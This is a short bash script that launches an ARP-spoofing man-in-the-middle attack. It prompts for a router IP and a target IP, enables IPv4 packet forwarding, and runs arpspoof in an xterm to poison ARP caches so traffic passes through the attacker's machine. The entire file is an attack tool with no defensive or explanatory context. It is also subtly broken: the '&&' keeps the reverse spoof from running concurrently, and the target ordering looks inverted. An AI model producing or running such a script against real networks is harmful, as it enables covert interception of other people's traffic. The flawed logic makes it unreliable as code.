#!/bin/bash
echo -n "Enter the router IP: "
read ip
echo -n "Enter Target IP: "
read tp

echo 1 > /proc/sys/net/ipv4/ip_forward
xterm -e arpspoof -t $ip $tp && arpspoof $tp $ip
